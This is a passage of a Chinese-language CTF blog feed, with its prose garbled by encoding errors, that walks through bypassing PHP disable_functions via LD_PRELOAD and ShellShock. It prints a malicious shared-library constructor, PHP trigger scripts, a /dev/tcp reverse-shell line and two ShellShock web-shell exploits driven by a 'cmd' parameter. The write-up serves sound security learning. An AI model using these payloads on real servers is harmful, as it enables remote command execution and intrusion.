href="https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">è„šæœ¬</a>ï¼Œæ”¾åœ¨VPSä¸Šç›‘å¬ï¼Œç„¶ååœ¨æµè§ˆå™¨å¡«å…¥VPSåœ°å€å’Œç«¯å£ï¼Œåˆ©ç”¨æ„é€ çš„mysqlèœœç½è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–<code>flag.php</code>ï¼Œå°±èƒ½æ‹¿åˆ°å®Œæ•´çš„flagäº†ã€‚</p><p>èµ›é¢˜ç¯å¢ƒæ²¡äº†ï¼Œæš‚æ—¶æ²¡æ³•å¤ç°äº†ï¼ŒçŸ¥é“åŸç†ï¼Œå›å¤´å†è¯•å§ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;20å¤šæ‰€é«˜æ ¡è”åˆå‡ºé¢˜æŠ—â€œç–«â€çš„æ¯”èµ›ï¼Œæ’é¢ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæ¥æ„Ÿå—ä¸€ä¸‹ä¼˜ç§€é«˜æ ¡çš„ç†é™¶ã€‚ğŸ§
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="æ¯”èµ›åˆ’æ°´" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="SQLæ³¨å…¥" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="å¸ƒå°”ç›²æ³¨" scheme="http://ggb0n.cool/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    
      <category term="ååºåˆ—åŒ–æ¼æ´" scheme="http://ggb0n.cool/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Pythonååºåˆ—åŒ–æ¼æ´" scheme="http://ggb0n.cool/tags/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="bypass functions_disable" scheme="http://ggb0n.cool/tags/bypass-functions-disable/"/>
    
      <category term="ä¸‡èƒ½å¯†ç ç»•è¿‡orè¿‡æ»¤" scheme="http://ggb0n.cool/tags/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87or%E8%BF%87%E6%BB%A4/"/>
    
      <category term="PHP sessionååºåˆ—åŒ–æ¼æ´" scheme="http://ggb0n.cool/tags/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="bypass URLé™åˆ¶" scheme="http://ggb0n.cool/tags/bypass-URL%E9%99%90%E5%88%B6/"/>
    
      <category term="çŸ­å‘½ä»¤æ‰§è¡Œ" scheme="http://ggb0n.cool/tags/%E7%9F%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="pickleååºåˆ—åŒ–" scheme="http://ggb0n.cool/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="ä¼ªé€ mysql-serverå®ç°ä»»æ„è¯»å–" scheme="http://ggb0n.cool/tags/%E4%BC%AA%E9%80%A0mysql-server%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-bypass_functions_disable</title>
    <link href="http://ggb0n.cool/2020/03/06/CTFHub-bypass-functions-disable/"/>
    <id>http://ggb0n.cool/2020/03/06/CTFHub-bypass-functions-disable/</id>
    <published>2020-03-06T05:54:14.000Z</published>
    <updated>2020-05-13T03:13:46.214Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸å¾—ä¸è¯´ï¼ŒLineå¸ˆå‚…ä»¬åœ¨æŠ€èƒ½æ ‘é‡Œå®‰æ’çš„è¿™ä¸ªåˆ†æ”¯çœŸæ˜¯å¤ªæ£’äº†ï¼ä½œä¸ºä¸€åèœé¸¡ï¼Œä¹‹å‰åªæ˜¯å¯¹<code>bypass functions_disable</code>æœ‰æ¯”è¾ƒå°‘å¹¶ä¸”ä¸æ¸…æ™°çš„ç†è§£ï¼Œä½†æ˜¯åˆ·äº†è¿™éƒ¨åˆ†é¢˜ç›¸å½“äºç³»ç»Ÿåœ°å­¦ä¹ äº†ä¸€éï¼Œå¸®åŠ©å¾ˆå¤§ï¼<a id="more"></a></p><p>ç°åœ¨çš„webé¢˜ä¸­<code>functions_disable</code>å¾ˆå¸¸è§ï¼Œå¾ˆå¤šæ—¶å€™éƒ½ä¼šè‹¦äºå°é©¬ä¸Šä¼ ã€èšå‰‘è¿ä¸Šä¹‹åä¸èƒ½è¯»flagæ–‡ä»¶å†…å®¹ã€ç»ˆç«¯ä¹Ÿæ‰§è¡Œä¸äº†å‘½ä»¤â€¦è¿™ä¸ªæ—¶å€™å°±è‚¯å®šæ˜¯è¿›è¡Œäº†<code>functions_disable</code>ï¼Œéœ€è¦æˆ‘ä»¬å°è¯•å„ç§å§¿åŠ¿æ¥bypassäº†ã€‚</p><p>é€šè¿‡è¿™ç¯‡åšå®¢ï¼Œå¥½å¥½è®°å½•ä¸€ä¸‹å„ç§ç»•è¿‡å§¿åŠ¿çš„å­¦ä¹ ã€‚</p><h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p>ä¸»è¦è€ƒå¯Ÿåˆ©ç”¨Linuxçš„ç¯å¢ƒå˜é‡<code>LD_PRELOAD</code>æ¥è¿›è¡Œ<code>functions_disable</code>çš„bypassã€‚</p><h3 id="å…³äºåˆ©ç”¨LD-PRELOAD-bypass"><a href="#å…³äºåˆ©ç”¨LD-PRELOAD-bypass" class="headerlink" title="å…³äºåˆ©ç”¨LD_PRELOAD bypass"></a>å…³äºåˆ©ç”¨LD_PRELOAD bypass</h3><blockquote><p>LD_PRELOADæ˜¯ä¸è½½å…¥å‡½æ•°åº“ç›¸å…³çš„ç¯å¢ƒå˜é‡,å®ƒçš„ä½œç”¨ä¾¿æ˜¯åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½æŒ‡å®šçš„å‡½æ•°åº“ã€‚</p><p>æ¯ä¸ªç¨‹åºæ‰§è¡Œçš„æ—¶å€™ä¼šå»åŠ¨æ€é“¾æ¥åº“<code>so</code>æ–‡ä»¶é‡Œé¢æ‰¾å‡½æ•°çš„ä½ç½®ï¼Œè€Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è®©ç¨‹åºå»æ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰çš„åŠ¨æ€é“¾æ¥åº“ï¼Œè¿™æ ·å°±ç›¸å½“äºåœ¨æ­£å¸¸ç¨‹åºä¸­è¿›è¡Œ<code>function_disable</code>ç¦ç”¨è¯¸å¦‚<code>system</code>ä¹‹å‰ä¾¿æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ã€‚</p></blockquote><p>ç»“åˆä¸Šè¿°ä¸¤ç‚¹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ª<code>so</code>æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶åå†ç”¨ä¸€ä¸ª<code>php</code>çš„è„šæœ¬æ¥æ¿€æ´»å¹¶è¾¾åˆ°åå¼¹shellçš„ç›®çš„ã€‚</p><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul><li>1ã€æ”¯æŒ<code>putenv</code></li><li>2ã€æ”¯æŒ<code>mail</code>ã€<code>imap_mail</code>ã€<code>mb_send_mail</code>æˆ–<code>error_log</code></li><li>3ã€å­˜åœ¨å¯å†™çš„ç›®å½•ï¼Œéœ€è¦ä¸Šä¼ <code>.so</code>æ–‡ä»¶</li></ul><h4 id="bypassæµç¨‹"><a href="#bypassæµç¨‹" class="headerlink" title="bypassæµç¨‹"></a>bypassæµç¨‹</h4><ul><li>1ã€åœ¨Linuxä¸‹ç”Ÿæˆå«æœ‰æ¶æ„ä»£ç çš„åŠ¨æ€é“¾æ¥ç¨‹åº</li><li>2ã€é€šè¿‡phpè„šæœ¬åˆ©ç”¨<code>putenv</code>æ¥è®¾ç½®<code>LD_PRELOAD</code>ï¼Œä½¿å¾—ä¼˜å…ˆè°ƒç”¨æˆ‘ä»¬æ„é€ çš„æ¶æ„åŠ¨æ€é“¾æ¥ç¨‹åº</li><li>3ã€é€šè¿‡ä¸Šè¿°çš„phpè„šæœ¬è§¦å‘æ¶æ„ä»£ç ï¼Œä»¥è¾¾åˆ°åå¼¹shellçš„ç›®çš„</li></ul><p>é¦–å…ˆï¼Œæ„é€ çš„åŠ¨æ€é“¾æ¥ç¨‹åºçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="keyword">void</span> Z2diMG4=()&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"cmd"</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        system(getenv(<span class="string">"cmd"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        system(<span class="string">"echo 'Hello' &gt; /hackfile"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ„é€ phpè§¦å‘è„šæœ¬</strong>ï¼š</p><p>è¿™é‡Œå¸¸ç”¨çš„æœ‰ä¸¤ç§æ–¹å¼ï¼š<code>Sendmail+LD_PRELOAD</code>å’Œ<code>error_log+LD_PRELOAD</code>ï¼Œå¦‚æœæœåŠ¡ç«¯æ²¡æœ‰ç¦æ­¢<code>mail</code>çš„ä½¿ç”¨ï¼Œå°±å¯ä»¥ç”¨å‰è€…ï¼Œåä¹‹å¯ä»¥ä½¿ç”¨åè€…ã€‚</p><p><strong>Sendmail+LD_PRELOAD</strong>ï¼šsendmailä¼šè°ƒç”¨<code>geteuid()</code>ï¼Œå› æ­¤å¯ä»¥è¿›è¡ŒåŠ«æŒï¼Œè¯¦ç»†çŸ¥è¯†å‚è€ƒ<a href="https://blog.csdn.net/xia739635297/article/details/104641082/">è¿™é‡Œ</a>ã€‚</p><p>è§¦å‘è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=ls &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†<code>so</code>æ–‡ä»¶ä¼ åˆ°<code>/tmp</code>æ–‡ä»¶å¤¹æ˜¯å› ä¸ºè¿™ä¸ªæ–‡ä»¶å¤¹ç”¨æˆ·æ˜¯å¯ä»¥è¿›è¡Œå†™å…¥çš„ï¼Œè‡ªå·±ä¹Ÿå¯ä»¥æ‰¾åˆ«çš„æ–‡ä»¶å¤¹æ¥çµæ´»æ„é€ ã€‚</p><p><strong>error_log+LD_PRELOAD</strong>ï¼šå½“é¢˜ç›®ç¯å¢ƒä¸æ”¯æŒ<code>mail</code>çš„æ—¶å€™ï¼Œå³å¯åˆ©ç”¨<code>error_log</code>æ¥è§¦å‘åŠ«æŒï¼Œæœ¬é¢˜å°±éœ€è¦ç”¨è¿™ç§æ–¹æ³•ã€‚</p><p>è§¦å‘è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=ls &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    error_log(<span class="string">"a"</span>,<span class="number">1</span>);</span><br><span class="line">    mail(<span class="string">"a@localhost"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¦å¤–å½“é¢˜ç›®ç¯å¢ƒå­˜åœ¨<code>gnupgæ‹“å±•</code>çš„æ—¶å€™è¿˜å¯ä»¥åˆ©ç”¨phpçš„<code>gnupg_init()</code>å‡½æ•°æ¥è§¦å‘ï¼Œå¯ä»¥åœ¨<code>phpinfo</code>ä¸­çœ‹åˆ°ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=ls &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    gnupg_init();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸Šé¢è„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤æ˜¯å°†<code>ls</code>æ‰§è¡Œçš„ç»“æœé‡å®šå‘åˆ°<code>hackfile</code>ä¸­æ¥æŸ¥çœ‹ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹çš„ä»£ç æ¥æ‹¿åˆ°shellï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    putenv(<span class="string">"cmd=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;1'"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/hack.so"</span>);</span><br><span class="line">    mail(<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®ï¼Œæºç ä¸­ç»™äº†éƒ¨åˆ†æºç ï¼š</p><p><img src="http://www.ggb0n.cool/images/ctfhub05.png" alt=""></p><p>æºç ä¸­æç¤ºå·²ç»å­˜åœ¨å°é©¬äº†ï¼Œä¸”ç§˜é’¥æ˜¯<code>ant</code>ï¼Œç›´æ¥æ‹¿åˆ°èšå‰‘é‡Œè¿æ¥èƒ½è¿ä¸Šï¼Œä½†æ˜¯flagæ–‡ä»¶æ— æ³•è®¿é—®ï¼Œå¼€ç»ˆç«¯ä¹Ÿæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼š</p><p><img src="http://www.ggb0n.cool/images/ctfhub06.png" alt=""></p><p>è‚¯å®šæ˜¯systemè¢«banäº†ï¼Œéœ€è¦è¿›è¡Œ<code>functions_disable</code>çš„bypassã€‚</p><p>æœ‰ä¸¤ç§æ–¹æ³•ï¼šåˆ©ç”¨èšå‰‘è‡ªå¸¦çš„æ’ä»¶æˆ–è€…è‡ªå·±æ‰‹å·¥bypass</p><p><strong>åˆ©ç”¨èšå‰‘æ’ä»¶</strong></p><p>è¿™ä¸ªæœ‰è¦æ±‚ï¼šè‡ªå·±çš„ç¯å¢ƒå¿…é¡»æ˜¯Linuxçš„ï¼Œå› ä¸ºå®ƒè¦ç”¨gccå»ç¼–è¯‘<code>so</code>æ–‡ä»¶ã€‚</p><p>è¿™ä¸ªè¦æ±‚æ»¡è¶³ä¹‹åä¾¿å¯ä»¥åœ¨<code>æ’ä»¶å¸‚åœº</code>ä¸­ä¸‹è½½<code>functions_disable</code>bypassçš„æ’ä»¶ï¼Œç„¶åé€‰æ‹©<code>LD_PRELOAD</code>è¿›è¡Œbypasså°±è¡Œäº†ã€‚</p><p>è¿™é‡Œæœ‰<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1">å®˜æ–¹è¯¦è§£</a></p><p><strong>æ‰‹åŠ¨bypass</strong></p><p>é¦–å…ˆåˆ©ç”¨å‰é¢æåˆ°çš„<code>C</code>ä»£ç ï¼Œåˆ©ç”¨ä¸‹é¢ä¸¤æ¡å‘½ä»¤ç”Ÿæˆ<code>so</code>æ–‡ä»¶ï¼š</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">gcc -c -fPIC ld_preload.c -o ld_preload</span><br><span class="line">gcc <span class="comment">--share ld_preload -o ld_preload.so</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/ctfhub07.png" alt=""></p><p>åŒæ—¶ç”¨ä¸Šè¿°çš„ä»£ç æ„é€ å¥½è§¦å‘çš„phpè„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//putenv("cmd=ls &gt; hackfile");</span></span><br><span class="line">    putenv(<span class="string">"cmd=/readflag &gt; hackfile"</span>);</span><br><span class="line">    putenv(<span class="string">"LD_PRELOAD=/tmp/ld_preload.so"</span>);</span><br><span class="line">    error_log(<span class="string">"a"</span>,<span class="number">1</span>);</span><br><span class="line">    mail(<span class="string">"a@localhost"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠ<code>so</code>æ–‡ä»¶ä¸Šä¼ åˆ°<code>/tmp/</code>æ–‡ä»¶å¤¹ä¸‹ï¼Œè§¦å‘è„šæœ¬ä¸Šä¼ åˆ°<code>/var/www/html/</code>ä¸‹</p><p>ç„¶ååœ¨æµè§ˆå™¨è®¿é—®æˆ‘ä»¬å†™å…¥çš„è§¦å‘è„šæœ¬ï¼Œç„¶åå›åˆ°èšå‰‘æŸ¥çœ‹æ•ˆæœï¼š</p><p><img src="http://www.ggb0n.cool/images/ctfhub09.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°<code>hackfile</code>æ–‡ä»¶å·²ç»å­˜åœ¨äº†ï¼Œæ‰“å¼€å³å¯æ‹¿åˆ°flag</p><p><img src="http://www.ggb0n.cool/images/ctfhub10.png" alt=""></p><p>å…³äºè¿™ç§bypasså§¿åŠ¿ï¼Œç½‘ä¸Šå¾ˆå¤šï¼Œä»¥ä¸‹å‡ ä¸ªå†™çš„å…¨é¢ä¸€äº›ï¼š<br><a href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a><br><a href="https://www.dazhuanlan.com/2020/01/06/5e128867c6c74/">https://www.dazhuanlan.com/2020/01/06/5e128867c6c74/</a></p><h2 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h2><p>ä¸»è¦è€ƒå¯Ÿåˆ©ç”¨bashç ´å£³æ¼æ´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿›è¡Œfunctions_disableçš„bypass</p><h3 id="å…³äºåˆ©ç”¨ShellShock-bypass"><a href="#å…³äºåˆ©ç”¨ShellShock-bypass" class="headerlink" title="å…³äºåˆ©ç”¨ShellShock bypass"></a>å…³äºåˆ©ç”¨ShellShock bypass</h3><blockquote><p>è¯¥å§¿åŠ¿ä¸»è¦æ˜¯å€ŸåŠ©äº†bashç ´å£³ï¼ˆ<a href="https://www.freebuf.com/news/48331.html">CVE-2014-6271</a>ï¼‰æ¼æ´ï¼Œç›´æ¥å¯¼è‡´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>mail()</code>å‡½æ•°æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œç»•è¿‡disable_functionsã€‚</p></blockquote><h4 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul><li>1ã€æ”¯æŒ<code>putenv</code></li><li>2ã€æ”¯æŒ<code>mail</code>ã€<code>imap_mail</code>ã€<code>mb_send_mail</code>æˆ–<code>error_log</code></li><li>3ã€<code>/bin/bash</code> å­˜åœ¨ <code>CVE-2014-6271</code> æ¼æ´</li><li>4ã€<code>/bin/sh -&gt; /bin/bash</code> sh é»˜è®¤çš„ shell æ˜¯ bash</li></ul><h4 id="bypassæµç¨‹-1"><a href="#bypassæµç¨‹-1" class="headerlink" title="bypassæµç¨‹"></a>bypassæµç¨‹</h4><ul><li>1ã€ç¼–å†™shellshockåˆ©ç”¨è„šæœ¬å¹¶ä¸Šä¼ </li><li>2ã€æµè§ˆå™¨è®¿é—®ä¸Šä¼ çš„è„šæœ¬è¿›è¡Œåå¼¹shell</li></ul><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸¤ç‰ˆè„šæœ¬ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//èšå‰‘æä¾›çš„</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span></span>&#123;</span><br><span class="line">  $d = dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">  <span class="keyword">if</span>(substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> &amp;&amp; function_exists(<span class="string">'putenv'</span>) &amp;&amp; (function_exists(<span class="string">'error_log'</span>) || function_exists(<span class="string">'mail'</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>)!=<span class="keyword">FALSE</span>)&#123;</span><br><span class="line">      $tmp=tempnam(sys_get_temp_dir(), <span class="string">'as'</span>);</span><br><span class="line">      putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">      <span class="keyword">if</span> (function_exists(<span class="string">'error_log'</span>)) &#123;</span><br><span class="line">        error_log(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        mail(<span class="string">"a@127.0.0.1"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"-bv"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"Not vuln (not bash)\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $output = @file_get_contents($tmp);</span><br><span class="line">    @unlink($tmp);</span><br><span class="line">    <span class="keyword">if</span>($output!=<span class="string">""</span>)&#123;</span><br><span class="line">      <span class="keyword">print</span>($output);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"No output, or not vuln."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"ä¸æ»¡è¶³ä½¿ç”¨æ¡ä»¶"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runcmd("whoami"); // è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line">runcmd($_REQUEST[<span class="string">"cmd"</span>]); <span class="comment">// ?cmd=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥åŠä¸‹é¢è¿™ä¸ªï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>); </span><br><span class="line">   putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actuallysend any mail </span></span><br><span class="line">   $output = @file_get_contents($tmp); </span><br><span class="line">   @unlink($tmp); </span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡èšå‰‘ä¸Šä¼ çš„webç›®å½•å¹¶è®¿é—®ï¼Œä¸å‡ºé—®é¢˜å³å¯é€šè¿‡<code>cmd</code>ä¼ å‚æ‰§è¡Œå‘½ä»¤ã€‚</p><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®è¿˜æ˜¯é‚£ä¸ªé¡µé¢ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub12.png" alt=""></p><p>ä¸Šèšå‰‘ï¼ŒåŒæ ·ä¸èƒ½é€šè¿‡ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹ä¸€ä¸‹phpinfoï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub13.png" alt=""></p><p>å‘ç°æ˜¯<code>PHP5+</code>ç‰ˆæœ¬ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨<code>shellshock</code>è¿›è¡Œbypassï¼Œä¸¤ç§æ–¹å¼ï¼šèšå‰‘æ’ä»¶ or æ‰‹å·¥â€¦</p><h4 id="åˆ©ç”¨èšå‰‘æ’ä»¶"><a href="#åˆ©ç”¨èšå‰‘æ’ä»¶" class="headerlink" title="åˆ©ç”¨èšå‰‘æ’ä»¶"></a>åˆ©ç”¨èšå‰‘æ’ä»¶</h4><p>å‚è€ƒ<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/2">è¿™é‡Œ</a>ã€‚</p><h4 id="æ‰‹å·¥bypass"><a href="#æ‰‹å·¥bypass" class="headerlink" title="æ‰‹å·¥bypass"></a>æ‰‹å·¥bypass</h4><p>åˆ©ç”¨ä¸Šè¿°ä»£ç æ„é€ expè„šæœ¬ï¼Œä¸Šä¼ å¹¶è®¿é—®ï¼Œå³å¯æ‹¿åˆ°shellï¼Œé€šè¿‡æ§åˆ¶cmdå‚æ•°å†…å®¹æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>è¯è¯´ï¼Œæˆ‘åšè¿™é¢˜çš„æ—¶å€™è¿™æ ·ç”¨æ²¡æˆåŠŸâ€¦åæ¥ç”¨l3m0nå¸ˆå‚…çš„è„šæœ¬æ‰“é€šçš„â€¦</p><p>è¿™é‡Œæä¸€ä¸‹l3m0nå¸ˆå‚…è„šæœ¬ä¸­çš„FUZZè„šæœ¬(å°±æ˜¯é‚£ä¸ªåä¸º<code>shell.php</code>çš„è„šæœ¬)ï¼Œä¸Šä¼ è¿™ä¸ªè„šæœ¬åˆ°webæ–‡ä»¶å¤¹ä¸‹ï¼Œè®¿é—®å³å¯FUZZå‡ºå¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub16.png" alt=""></p><p>ç„¶åå€ŸåŠ©äº†<code>apache_mod_cgi</code>çš„è§£é¢˜æ–¹å¼æœ€ç»ˆæ‹¿åˆ°çš„flagã€‚</p><p>å¯å‚è€ƒï¼š<br><a href="https://www.secpulse.com/archives/2300.html">https://www.secpulse.com/archives/2300.html</a></p><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache 